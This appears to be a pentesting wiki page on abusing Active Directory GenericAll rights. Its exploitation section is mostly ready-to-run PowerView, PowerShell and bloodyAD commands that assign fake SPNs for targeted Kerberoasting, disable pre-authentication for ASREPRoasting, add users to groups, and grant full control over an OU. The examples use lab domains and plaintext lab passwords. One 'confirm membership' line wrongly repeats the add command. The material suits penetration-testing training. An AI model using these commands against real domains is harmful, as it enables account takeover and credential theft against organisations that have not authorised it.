---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# GenericAll

## Information

**Full control** over the target account.

<table><thead><tr><th width="290">Over a User</th><th width="192">Over a Group</th><th>Over an OU</th></tr></thead><tbody><tr><td><a href="forcechangepassword.md">Change the account's password</a></td><td><a href="genericall.md#add-user-to-the-group">Add user to the group</a></td><td><a href="genericall.md#over-an-ou"><code>FullControl</code> on its members</a></td></tr><tr><td><a href="genericall.md#targeted-kerberoasting">Targeted Kerberoasting</a></td><td></td><td></td></tr><tr><td><a href="genericall.md#targeted-asreproasting">Targeted ASREPRoasting</a></td><td></td><td></td></tr></tbody></table>

## Exploitation

### Over a User

<figure><img src="../../../../.gitbook/assets/genericall_group_over_user.png" alt=""><figcaption><p>Figure 1: The Information Technology group has GenericAll rights over the user adunn.</p></figcaption></figure>

#### Targeted Kerberoasting

When a group/user has `GenericAll` rights over another account, a fake SPN can be assigned to the target account.

{% code overflow="wrap" %}
```powershell
# credentialed object for the currently owned user
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
 
# create a fake SPN for the target user
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
{% endcode %}

Once the SPN is assigned to the target account, we should be able to [Kerberoast](../attacks/kerberoasting.md) it.

#### Targeted ASREPRoasting

We can disable pre-authentication for the target account and then [ASREPRoast](../attacks/asreproasting.md) it.

```powershell
Set-DomainObject -Identity <USER> -XOR @{UserAccountControl=4194304}
```

{% tabs %}
{% tab title="PS" %}
```powershell
Set-DomainObject -Identity <USER> -XOR @{UserAccountControl=4194304}
```
{% endtab %}

{% tab title="PowerView" %}
```powershell
# set the preauth option to true
Get-ADUser <USER> | Set-ADAccountControl -doesnotrequirepreauth $true
# check that it worked
Get-ADUSer -Filter 'DoesNotRequirePreAuth -eq $true'
```
{% endtab %}
{% endtabs %}

An example of the above method can be found [here](../../../../boxes/boxes/insane/multimaster.md#genericwrite-rights).

#### Change user's password

Check [here](forcechangepassword.md).

### Over a Group

#### Add User to the Group

This can be done using [native commands](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754051\(v=ws.11\)), the [AD PS module](https://learn.microsoft.com/en-us/powershell/module/activedirectory/add-adgroupmember?view=windowsserver2022-ps), or PowerView.

{% tabs %}
{% tab title="PowerView.py" %}
{% code overflow="wrap" %}
```bash
# connect to the DC
powerview rebound.htb/oorend:'1GR8t@$$4u'@rebound.htb -k
# add user to the group
PV > Add-DomainGroupMember -Identity servicemgmt -Members oorend
# confirm group membership
PV > Get-DomainGroupMember -Identity servicemgmt
```
{% endcode %}
{% endtab %}

{% tab title="PowerView" %}
{% code overflow="wrap" %}
```powershell
# Adding user to the group
Add-ADGroupMember -Identity '<GROUP>' -Members <USER>
# Adding user to the group (using another user's creds)
Add-DomainGroupMember -Identity 'Core Staff' -Members 'jdgodd' -Credential $Cred -Verbose 
# Confirming group membership
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
```
{% endcode %}
{% endtab %}

{% tab title="net" %}
```powershell
# add user to the group
net group '<GROUP>' <USER> /add /domain
# confirm group membership
net group <GROUP> /domain
```
{% endtab %}
{% endtabs %}

### Over an OU

If a group has `GenericAll` rights over an OU, then the group members can be assigned  `GenericAll` rights over the OU as well, which results in them having `FullControl` over the OU members. This gives the ability to [change any OU user's password](forcechangepassword.md).

{% tabs %}
{% tab title="bloodyAD" %}
{% code overflow="wrap" %}
```bash
# give oorend GenericAll rights over the Service Users OU
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
# confirm FullControl over OU members (winrm_svc)
powerview rebound.htb/oorend:'1GR8t@$$4u'@rebound.htb -k
PV > Get-DomainObjectAcl -Identity winrm_svc -Where "SecurityIdentifier contains oorend"
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Resources

{% tabs %}
{% tab title="BH Edge" %}
{% embed url="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#genericall" %}
{% endtab %}
{% endtabs %}
